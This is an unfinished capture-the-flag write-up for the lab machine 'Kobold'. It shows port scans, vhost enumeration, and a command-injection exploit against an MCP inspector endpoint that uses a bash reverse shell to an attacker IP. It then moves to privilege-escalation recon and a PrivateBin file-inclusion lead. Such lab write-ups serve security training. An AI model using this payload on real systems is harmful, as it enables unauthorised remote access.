---
layout: default
title: Kobold
status: incomplete
---

## TL;DR


### Recon

we start with `rustscan`, using this command:
```bash
rustscan -a $target -- -sV -sC -oN nmap.txt -oX nmap.xml
```

![rustscan](Pasted%20image%2020260322212851.png)

we got port `22` with ssh, port `80` with http, port `443` with https and port `3552` with some http server.

```bash
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)                                                        
| ssh-hostkey:                                                                    
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDyfTq7atQNY2qg78Nt+Q/rowZnmsZ0+vG+FraL750n57MCUNo0a/hw/Df2XfLKPUGiVIVYmQTraVft8Xv2
AjYk=                                                                                                                                                        
|   256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)                                                                                            
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHDfvijaU/WiU8D/im7cOg8k4NeAOUgCHq16HhCbmZcI                                                                           
80/tcp   open  http     syn-ack ttl 63 nginx 1.24.0 (Ubuntu)                                                                                                 
|_http-title: Did not follow redirect to https://kobold.htb/                                                                                                 
|_http-server-header: nginx/1.24.0 (Ubuntu)                                                                                                                  
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
443/tcp  open  ssl/http syn-ack ttl 63 nginx 1.24.0 (Ubuntu)                                                                                                 
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
|_ssl-date: TLS randomness does not represent time                                                                                                           
|_http-server-header: nginx/1.24.0 (Ubuntu)            
3552/tcp open  http     syn-ack ttl 63 Golang net/http server                                                                                                
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
|_http-favicon: Unknown favicon MD5: F9C2482A3FE92BDB5276156F46E0D292                                                                                        
|_http-title: Site doesn't have a title (text/html; charset=utf-8). 
```

Let's add `kobold.htb` to our `/etc/hosts`.
### ...

We can see this login page on port `3552`, to some Arcane service. I googled and found that version `1.13.0` of Arcane is vulnerable to `authenticated RCE`.

![arcane](Pasted%20image%2020260322222449.png)

First, we need to login in order to achieve the exploit shown in [https://github.com/Augmaster/POC-CVE-2026-23520](https://github.com/Augmaster/POC-CVE-2026-23520). However, since I don't have any credentials, I decided to continue investigating the website, using subdomain enumeration.

I executed this on port `443`, don't forget the `-k` to ignore the ssl error:
```bash
┌──(agonen㉿kali)-[~/htb/Kobold/CVE-2026-23520]
└─$ gobuster vhost -u 'https://kobold.htb/' --ad -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --xs 302 -k     
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       https://kobold.htb/
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
mcp.kobold.htb Status: 200 [Size: 466]
#www.kobold.htb Status: 400 [Size: 166]
bin.kobold.htb Status: 200 [Size: 24402]
```

We got two valid subdomains, `mcp.kobold.htb` and `bin.kobold.htb`, let's add them to our `/etc/hosts`.

I went to `https://mcp.kobold.htb/`:

![mcp](Pasted%20image%2020260323102530.png)

Okay, I found this exploit [https://github.com/0xzap/CVE-2026-23520](https://github.com/0xzap/CVE-2026-23520), let's regenerate this exploit manually, using Burp Suite.
We need to send POST request to `/api/mcp/connect`, with command injection, this payload:

```json
{
  "serverConfig": {
    "command": "bash",
    "args": [
      "-c",
      "bash -i >& /dev/tcp/10.10.14.110/1337 0>&1"
    ],
    "env": {}
  },
  "serverId": "exploit"
}
```

Don't forget to setup listener on port `1337`:

![nc](Pasted%20image%2020260323103540.png)

I pasted the `penelope` payload for easier reverse shell:
![](Pasted%20image%2020260323103659.png)

The user flag:
```bash
ben@kobold:~$ cat user.txt 
14a0d3d63f4987e7309fd53279fe545f
```
### Privilege Escalation to Root

We can see we are the user `ben`, and also are in the group `operator`:
```bash
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator) 
```

I checked for files from this `operator` group:
```bash
ben@kobold:~$ find / -group operator 2>/dev/null
/privatebin-data
/privatebin-data/certs
/privatebin-data/certs/key.pem
/privatebin-data/certs/cert.pem
/privatebin-data/data
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/bd
/privatebin-data/data/bd/b5
/privatebin-data/data/.htaccess
/privatebin-data/data/e3
/privatebin-data/data/traffic_limiter.php
/privatebin-data/data/salt.php
```

Okay, we can control this all `/privatebin-data`, let's investigate more the subdomain `bin.kobold.htb` we found earlier:

![private bin](Pasted%20image%2020260323104123.png)

This specific version leads us to `RFI` vulnerability, explained here [https://github.com/advisories/GHSA-g2j9-g8r5-rg82](https://github.com/advisories/GHSA-g2j9-g8r5-rg82).

